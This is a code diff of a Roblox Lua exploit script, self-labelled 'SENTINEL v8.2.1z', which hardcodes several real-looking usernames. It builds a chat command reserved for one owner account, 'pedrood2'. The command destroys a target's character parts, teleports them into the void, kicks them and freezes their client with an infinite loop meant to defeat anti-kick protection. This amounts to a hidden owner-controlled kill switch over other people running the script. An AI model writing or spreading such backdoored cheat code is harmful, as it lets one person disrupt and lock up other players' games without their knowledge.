@@ -14,18 +14,19 @@ local Player = game:GetService("Players").LocalPlayer
 local Mouse = Player:GetMouse()
 local StarterGui = game:GetService("StarterGui")
 
-local sigma = {
+local sigmas = {
     "pedrood2", 
-    "ii_dino122",
+    "iidino122",
     "iAmLegitTrust_p",
     "Milaneso202_xd"
 }
 
 local alpha = "!users"
+local connectedPlayers = {} -- Tabla para evitar conexiones duplicadas
 
--- Verify is user is admin ong
+-- Verificar si un usuario es admin
 local function admins(name)
-    for _, admin in ipairs(sigma) do 
+    for _, admin in ipairs(sigmas) do 
         if admin:lower() == name:lower() then
             return true
         end
@@ -33,44 +34,47 @@ local function admins(name)
     return false
 end
 
--- objetive kick
+-- Ejecutar kick
 local function executeKick(targetPlayer)
-local player = game.Players.LocalPlayer
-wait(0.1)
-Workspace[player.Name].Torso:Destroy()
-wait(0.1)
-local bool = true
+    local char = targetPlayer.Character
+    if char and char:FindFirstChild("Torso") then
+        char.Torso:Destroy()
+    end
+    wait(0.1)
 
-if bool then
-    game.Workspace.FallenPartsDestroyHeight = 0 / 0
-else
-    game.Workspace.FallenPartsDestroyHeight = -500
+    targetPlayer:Kick("You were kicked by Dev/Admin.")
+
+    local bool = true
+    if bool then
+        game.Workspace.FallenPartsDestroyHeight = 0 / 0
+    else
+        game.Workspace.FallenPartsDestroyHeight = -500
+    end
+
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        char.HumanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
+    end
+    wait(0.3)
+    
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid:Destroy()
+    end
+    wait(0.2)
+    if char and char:FindFirstChild("Head") then
+        char.Head:Destroy()
+    end
+    wait(0.3)
+    for _, limb in ipairs({"Right Leg", "Left Leg", "Right Arm", "Left Arm"}) do
+        if char and char:FindFirstChild(limb) then
+            char[limb]:Destroy()
+        end
+    end
+    wait(0.5)
+	while true do 
+	end
 end
---void kicked user to force anti play
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
-wait(0.3)
-Workspace[player.Name].Humanoid:Destroy()
-wait(0.2)
-Workspace[player.Name].Head:Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Right Leg"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Left Leg"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Right Arm"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Left Arm"):Destroy()
-    -- Deletes all players parts (perm void)
-    wait()
-  
-    targetPlayer:Kick("You were kicked by Dev/Admin.") -- Dynamic kick to more faster
 
-	wait(0.5)
-while true do -- if user has anti kick frooze game method (not playable)
-   end
-end
-
--- autocomplete user example :kick pedr
+-- Buscar jugador por nombre parcial
 local function findPlayerByName(partialName)
     partialName = partialName:lower()
     for _, player in pairs(game.Players:GetPlayers()) do
@@ -81,21 +85,29 @@ local function findPlayerByName(partialName)
     return nil
 end
 
-
+-- Manejar mensajes del chat
 local function onChatMessage(player, message)
-    -- ignore owner username on users command
-    if message:lower() == alpha:lower() and player.Name:lower() ~= "pedrood2" then
-        local args = {
-            [1] = ">>> I'M USING SENTINEL v8.2.1z!<<<",
-            [2] = "All"
-        }
-        game:GetService("ReplicatedStorage")
-            :WaitForChild("DefaultChatSystemChatEvents")
-            :WaitForChild("SayMessageRequest")
-            :FireServer(unpack(args))
+    -- Comando ":users"
+    if message:lower() == alpha:lower() and admins(player.Name) then
+        for _, sigmaUser in ipairs(sigmas) do
+            if sigmaUser:lower() ~= player.Name:lower() then -- Excluir al ejecutor del comando
+                local sigmaPlayer = findPlayerByName(sigmaUser)
+                if sigmaPlayer and sigmaPlayer ~= player then -- Verificar que no sea el ejecutor
+                    -- Enviar mensaje "HII!" al chat
+                    local args = {
+                        [1] = ">>> I'M USING SENTINEL v8.2.1z!<<<",
+                        [2] = "All"
+                    }
+                    game:GetService("ReplicatedStorage")
+                        :WaitForChild("DefaultChatSystemChatEvents")
+                        :WaitForChild("SayMessageRequest")
+                        :FireServer(unpack(args))
+                end
+            end
+        end
     end
 
-    -- Owner only can kick players
+    -- Comando ":kick" reservado para pedrood2
     if message:sub(1, 5):lower() == "!kick" and player.Name:lower() == "pedrood2" then
         local partialName = message:sub(7):lower()
         local targetPlayer = findPlayerByName(partialName)
@@ -104,32 +116,39 @@ local function onChatMessage(player, message)
         else
             player:Kick("Player not found: " .. partialName)
         end
-    elseif message:sub(1, 5):lower() == ":kick" then
-game.StarterGui:SetCore("SendNotification", {
-    Title = "Note:";
-    Text = "You do not have permission to use this command (Owner Only)";
-    Icon = "http://www.roblox.com/asset/?id=5585095509";
-    Duration = 5;
-    callback = bindableFunction;
-})
+    elseif message:sub(1, 5):lower() == "!kick" then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Note:",
+            Text = "You do not have permission to use this command (Owner Only)",
+            Icon = "http://www.roblox.com/asset/?id=5585095509",
+            Duration = 5,
+            callback = bindableFunction,
+        })
     end
 end
 
--- Connect into new players
+-- Conectar eventos a nuevos jugadores
 local players = game:GetService("Players")
 
 players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        onChatMessage(player, message)
-    end)
+    if not connectedPlayers[player] then
+        connectedPlayers[player] = true
+        player.Chatted:Connect(function(message)
+            onChatMessage(player, message)
+        end)
+    end
 end)
 
--- Connect w actual players
+-- Conectar eventos a jugadores existentes
 for _, player in ipairs(players:GetPlayers()) do
-    player.Chatted:Connect(function(message)
-        onChatMessage(player, message)
-    end)
+    if not connectedPlayers[player] then
+        connectedPlayers[player] = true
+        player.Chatted:Connect(function(message)
+            onChatMessage(player, message)
+        end)
+    end
 end
+
 
 -- Función para mostrar una notificación
 local function showNotification(title, text, duration)
